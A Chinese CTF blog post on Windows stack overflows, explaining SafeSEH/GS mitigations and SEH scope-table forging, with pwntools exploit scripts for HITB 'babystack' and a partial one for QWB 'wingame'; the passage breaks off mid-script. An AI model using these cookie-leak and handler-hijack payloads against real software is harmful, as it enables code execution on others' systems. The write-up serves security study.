<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>WINPWN栈溢出 | starssgo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">WINPWN栈溢出</h1><a id="logo" href="/.">starssgo</a><p class="description">越努力,越幸运。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">WINPWN栈溢出</h1><div class="post-meta">Sep 5, 2020<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><a class="disqus-comment-count" href="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/#vcomment"><span class="valine-comment-count" data-xid="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/"></span><span> Comment</span></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows下的机制"><span class="toc-number">1.</span> <span class="toc-text">Windows下的机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SEH机制"><span class="toc-number">2.</span> <span class="toc-text">SEH机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#程序利用"><span class="toc-number">3.2.</span> <span class="toc-text">程序利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.3.</span> <span class="toc-text">exp:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子2"><span class="toc-number">4.</span> <span class="toc-text">例子2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用思路"><span class="toc-number">4.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">4.4.</span> <span class="toc-text">exp:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="post-content"><p>简单的栈溢出题，边学边写。</p>
<a id="more"></a>

<h3 id="Windows下的机制"><a href="#Windows下的机制" class="headerlink" title="Windows下的机制"></a>Windows下的机制</h3><p>在Windows下有一个类似与Linux下的checksec版的检测工具。<br><a href="https://github.com/trailofbits/winchecksec" target="_blank" rel="noopener">winchecksec</a><br>由于在安装过程中需要挺多依赖库的，当时我又没有找到编译好的，于是我编译中费了挺多事的，这里是编译好的<a href="https://github.com/Starssgo/release-winchecksec" target="_blank" rel="noopener">release版本</a>的。<br>保护机制的总结:  </p>
<blockquote>
<p>1.Dynamic Base/ASLR:地址随机化,指示应用程序是否应在加载时随机变基，并启用虚拟地址分配随机化，这会影响堆、堆栈和其他操作系统分配的虚拟内存位置。 /DYNAMICBASE选项适用于32位和64位映像。 Windows Vista 和更高版本的操作系统支持 ASLR。<br>2.High Entropy VA:高熵64位地址空间布局随机化,内核将进程的地址空间布局作为 ASLR 的一部分随机化时，Windows 内核的兼容版本可以使用更高程度的熵。 如果内核使用更高程度的熵，则可向内存区域（例如堆栈或堆）分配更多的地址。 因此，猜测特定内存区域的位置会更加困难。如果此选项处于打开状态，则目标可执行文件及其依赖的任何模块在作为 64 位进程运行时，必须能够处理大于 4 GB 的指针值。<br>3.Force Integrity:如果为DLL设置了FORCE U INTEGRITY标志，并且DLL没有签名或签名无效，Windows将不会在进程内加载DLL。<br>4.Isolation:隔离保护机制,如果开启，程序将在一个相对隔离环境中加载,从而防止攻击者提权。<br>5.NX:内存页不可运行,将数据段与代码段分开，就防止了代码在数据段运行，比如在栈，堆中执行代码段。<br>6.SEH:结构化异常处理机制,是微软在Windows系统中引入的异常处理机制。与C++的try…catch…类似，但是更强大更全面一些。<br>7.CFG:这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点， 最终及时并有效的进行异常处理，避免引发相关的安全问题。就是在程序间接跳转之前，会判断这个将要跳转的地址是否是合法的。<br>8.RFG:会在每个函数头部将返回地址保存到fs:[rsp]（Thread Control Stack)，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止了这些攻击方式。<br>9.SafeSEH:会事先为你定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序正式运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行。<br>10.GS:在栈中写入cookie,在函数返回前进行检查,如果改变了程序终止。<br>11.Authenticode:采用数字证书对应用程序代码进行签名，数字证书用于验证应用程序发行者的真实性。<br>12..net:代码混淆保护,编译到本地代码,将代码隐藏到资源中。  </p>
</blockquote>
<h3 id="SEH机制"><a href="#SEH机制" class="headerlink" title="SEH机制"></a>SEH机制</h3><p>异常回调函数的处理过程如下图<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/1.png" alt><br>其中线程信息块也叫做TIB块,结构如图所示:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _NT_TIB&#123;</span><br><span class="line">    struct _EXCEPTION_REGISTRATION_RECORD *Exceptionlist; // 指向当前线程的 SEH</span><br><span class="line">    PVOID StackBase;    // 当前线程所使用的栈的栈底</span><br><span class="line">    PVOID StackLimit;   // 当前线程所使用的栈的栈顶</span><br><span class="line">    PVOID SubSystemTib; // 子系统</span><br><span class="line">    union &#123;</span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        ULONG Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    struct _NT_TIB *Self; //指向TIB结构自身</span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure>
<p>它永远放在fs段选择器指定的数据段的0偏移处，即fs:[0]的地方就是TIB结构。<br>其中_EXCEPTION_REGISTRATION_RECORD结构主要用于描述线程异常处理句柄的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系。<br>结构内容如下:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//  Code in https://source.winehq.org/source/include/winnt.h#2623</span><br><span class="line"></span><br><span class="line">typedef struct _EXCEPTION_REGISTRATION_RECORD&#123;</span><br><span class="line">    struct _EXCEPTION_REGISTRATION_RECORD *Next; // 指向下一个结构的指针</span><br><span class="line">    PEXCEPTION_ROUTINE Handler; // 当前异常处理回调函数的地址</span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
<p>其中SEH链及异常的传递为:<br>通知调试器→SEH链→顶层异常处理→系统默认处理<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/2.png" alt><br>这个时候我们的思路就已经有了,如果我们可以直接覆盖Handler块,然后我们让程序进入异常处理,我们就可以实现控制程序了。<br>但是在SaFeSEH中，安全结构化异常处理表之外的异常处理程序将会被阻止运行。我们覆盖的地址肯定不在安全结构化异常处理表之内,所以直接覆盖Handler的方法就不能执行。<br>这个时候我们就需要去伪造scope table结构体,它地址位于栈上的位置在ebp-0x8处,存的值是和<strong>_security_cookie异或之后的结果。<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/3.png" alt><br>在Scope table中保存了</strong>try块相匹配的 __except 或 __finally的地址值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">struct _EH4_SCOPETABLE &#123;</span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[1];</span><br><span class="line">&#125;;</span><br><span class="line">struct _EH4_SCOPETABLE_RECORD &#123;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        long (*FilterFunc)();</span><br><span class="line">            union &#123;</span><br><span class="line">            void (*HandlerAddress)();</span><br><span class="line">            void (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们可以看到<code>HandlerAddress</code>与<code>FinallyFunc</code>是两个指针，如果我们能够伪造一个能够通过前面的代码判断的结构体。我们就可以劫持这个指针。<br>当程序触发异常后,程序执行<code>__except_handler4</code>函数,此函数代码为:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl _except_handler4(int a1, int a2, int a3, int a4)</span><br><span class="line">&#123;</span><br><span class="line">  return except_handler4_common(&amp;__security_cookie, __security_check_cookie, a1, a2, a3, a4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>except_handler4_common</code>是一个库函数。<br>以下代码是except中的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int v3; // esi@2</span><br><span class="line">    unsigned int v4; // esi@3</span><br><span class="line"></span><br><span class="line">    if ( scopeTable-&gt;GSCookieOffset != -2 )</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];</span><br><span class="line">        __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];</span><br><span class="line">    __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __cdecl _except_handler4_common(unsigned int *securityCookies, void (__fastcall *cookieCheckFunction)(unsigned int), _EXCEPTION_RECORD *exceptionRecord, unsigned __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    // 异或解密 scope table</span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + 8));</span><br><span class="line"></span><br><span class="line">    // sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span><br><span class="line">    framePointer = (char *)(sehFrame + 16);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"></span><br><span class="line">    // 验证 GS</span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (char *)(sehFrame + 16));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"></span><br><span class="line">    if ( exceptionRecord-&gt;ExceptionFlags &amp; 0x66 )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + 12);</span><br><span class="line">        *(_DWORD *)(sehFrame - 4) = &amp;exceptionPointers;</span><br><span class="line">        if ( tryLevel != -2 )</span><br><span class="line">        &#123;</span><br><span class="line">            while ( 1 )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + 2 * (tryLevel + 2);</span><br><span class="line">                filterFunc = (int (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((char *)scopeTable_1 + 4 * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                if ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    // 调用 FilterFunc</span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    if ( filterFuncRet &gt; 0 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        // 调用 HandlerFunc</span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + 16);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                if ( encloseingLevel == -2 )</span><br><span class="line">                    break;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码是<a href="https://www.anquanke.com/post/id/188170#h3-3" target="_blank" rel="noopener">这个老哥</a>分析的，我只是后人乘凉了。  </p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>[HITB GSEC]BABYSTACK  </p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>程序的逻辑还是十分简单的,在程序一开始就泄露了程序的stack地址与text段的地址，如果输入yes,程序打印<code>v5</code>与<code>*v5</code>,即我们可以用这个来进行任意地址的泄露。<br>如果输入不等于no跟yes,程序进入栈溢出分支。<br>存在后门函数<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/1.jpg" alt>  </p>
<h4 id="程序利用"><a href="#程序利用" class="headerlink" title="程序利用"></a>程序利用</h4><p>现在我们只要知道win的栈空间是什么样子的，以及怎么去劫持指针就可以实现利用。<br>首先我们通过x32dbg来看一波在栈溢出分支内的栈结构<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/2.jpg" alt><br>0x313FCE4为ebp的地址,上面俺贴出了栈的结构图,ebp-0x8为<code>Scope_table</code>,ebp-0xc指向<code>__except_handler4</code>函数,ebp-0x10指向下一个SEH指针。ebp-0x1c为GS。<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/3.jpg" alt><br>这边可以看到,GS其实是<code>__security_cookie^ebp</code>后的值，ebp-0xc处存放<code>__security_cookie^Scope_table</code>，所以我们要伪造<code>Scope_table</code>结构，我们需要在栈上放入与<code>__security_cookie</code><br>异或完事后的指针。<br>首先我们伪造<code>Scope_table</code>   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SCOPETABLE = [</span><br><span class="line">    0x0FFFFFFE4, #GSCookieOffset</span><br><span class="line">    0, 		#GSCookieXOROffset</span><br><span class="line">    0x0FFFFFF20,#EHCookieOffset	</span><br><span class="line">    0,		#EHCookieXOROffset</span><br><span class="line">    0xFFFFFFFE, #EnclosingLevel</span><br><span class="line">    shell_addr,#HandlerAddress</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>然后我们写payload  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=&quot;A&quot;*4+flat(SCOPETABLE).ljust(0x80-4)+p32(ebp^security_cookie)+&quot;A&quot;*8</span><br><span class="line">payload+=p32(next_SEH)+p32(__except_handler4_addr)+p32(FAKE_SCOPTABLE^security_cookie)</span><br></pre></td></tr></table></figure>
<p>在此我们需要<code>security_cookie,ebp,next_SEH,__except_handler4_addr</code>这些的地址。<br><code>security_cookie</code>在程序偏移<code>0x4004</code>处，我们可以通过泄露的text地址来计算出<code>security_cookie</code>的地址从而泄露。<br>ebp的地址可以直接通过泄露的栈地址来计算出来。<br><code>next_SEH,__except_handler4_addr</code>同理。  </p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;i386&apos;</span><br><span class="line"></span><br><span class="line">p = remote(&apos;10.160.104.134&apos;, 10000)</span><br><span class="line">p.recvuntil(&quot;address = 0x&quot;)</span><br><span class="line">stack_addr=int(p.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">p.recvuntil(&quot;address = 0x&quot;)</span><br><span class="line">main_addr=int(p.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">shell_addr=main_addr+733</span><br><span class="line">print &quot;stack_addr=&quot;,hex(stack_addr)</span><br><span class="line">print &quot;base_addr=&quot;,hex(main_addr-0x10b0)</span><br><span class="line">print &quot;BP_addr=&quot;,hex(main_addr-0x10b0+0x1272)</span><br><span class="line">print &quot;shell_addr=&quot;,hex(shell_addr)</span><br><span class="line">next_SEH=stack_addr+0xd4</span><br><span class="line">security_cookie_addr=main_addr-0x10b0+0x4004</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;know more?\r\n&quot;,&quot;yes&quot;)</span><br><span class="line">p.sendlineafter(&quot;want to know\r\n&quot;,str(security_cookie_addr))</span><br><span class="line">p.recvuntil(&quot;value is 0x&quot;)</span><br><span class="line">security_cookie=int(p.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">SCOPETABLE = [</span><br><span class="line">    0x0FFFFFFE4, #GSCookieOffset</span><br><span class="line">    0, 		#GSCookieXOROffset</span><br><span class="line">    0x0FFFFFF20,#EHCookieOffset	</span><br><span class="line">    0,		#EHCookieXOROffset</span><br><span class="line">    0xFFFFFFFE, #EnclosingLevel</span><br><span class="line">    shell_addr,#HandlerAddress</span><br><span class="line">]</span><br><span class="line">payload=&quot;A&quot;*4+flat(SCOPETABLE).ljust(0x80-4)+p32((stack_addr+0x9c)^security_cookie)+&quot;A&quot;*8</span><br><span class="line">payload+=p32(next_SEH)+p32(main_addr-0x10b0+0x1460)+p32((stack_addr+0x4)^security_cookie)</span><br><span class="line">print &quot;len=&quot;,hex(len(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;know more?\r\n&quot;,&quot;no12&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(&quot;know more?\r\n&quot;,&quot;yes&quot;)</span><br><span class="line">p.sendlineafter(&quot;want to know\r\n&quot;,&quot;0&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>2020强网杯wingame  </p>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>程序保护查看<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/5.jpg" alt><br>查找漏洞<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/4.jpg" alt><br>可以看到程序让input三次,input存在溢出,如果我们用第一次的溢出来泄露GS,最后一次的溢出来控制返回地址到main函数地址,那么第二次的溢出就是我们可以去自由发挥的地方。  </p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>我们可以查看在read时候的栈结构<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/6.jpg" alt><br>发现如果我们控制输入的长度，可以泄露出stack的程序地址，<code>kernel32.dll</code>的地址，<code>ntdll.dll</code>的地址。<br>这也就意味着我们可以任意调用这两个dll的任何函数与汇编。<br>但是在我们的搜索后发现,这两个dll中没有能够shell的函数,反而在我们无法控制的<code>ucrtbase.dll</code>中找到了system函数。<br>但是我们没办法去泄露<code>ucrtbase.dll</code>的地址。<br>于是这里我们使用在<code>kernel32.dll</code>里的<code>LoadLibraryA</code>函数来加载<code>ucrtbase.dll</code>,这样他的返回值就为<code>ucrtbase.dll</code>的基地址,通过构造特定的ROP链来实现shell。<br>于是我们的利用大致思路就有了  </p>
<blockquote>
<p>1.泄露kernel32.dll、ntdll.dll与程序的地址<br>2.在bss中写入<code>kernel32.dll</code>与<code>cmd</code>字符串<br>3.调用LoadLibraryA将ucrtbase.dll返回地址带入rax<br>4.通过add_rax来实现rax=shell<br>5.通过jmp rax来执行shell   </p>
</blockquote>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>1.泄露地址<br>我们通过计算偏移来泄露处GS的值,这里偏移是<code>(0x118-0x18)</code>    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0xf8+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">stack_cookie=u64(p.recvuntil(&apos;\r\n&apos;,drop = True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_cookie1=&quot;,hex(stack_cookie)</span><br></pre></td></tr></table></figure>
<p>然后我们来泄露程序的基地址  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x110+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">exe_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))-0x12f4</span><br><span class="line">print hex(exe_addr)</span><br></pre></td></tr></table></figure>
<p>通过泄露出来的程序地址与GS的值来构造payload令程序返回到main函数头，使程序循环。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main_addr=exe_addr+0x1000</span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x100+p64(stack_cookie)+&quot;a&quot;*0x10+p64(main_addr))</span><br></pre></td></tr></table></figure>
<p>同理，我们可以泄露出<code>kernel32.dll</code>与<code>ntdll.dll</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0xf8+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">stack_cookie=u64(p.recvuntil(&apos;\r\n&apos;,drop = True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_cookie2=&quot;,hex(stack_cookie)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x148+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">kernel32_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))-0x14034</span><br><span class="line">print &quot;kernel32.dll=&quot;,hex(kernel32_addr)</span><br><span class="line">LoadLibraryA=kernel32_addr+0x1E710</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span 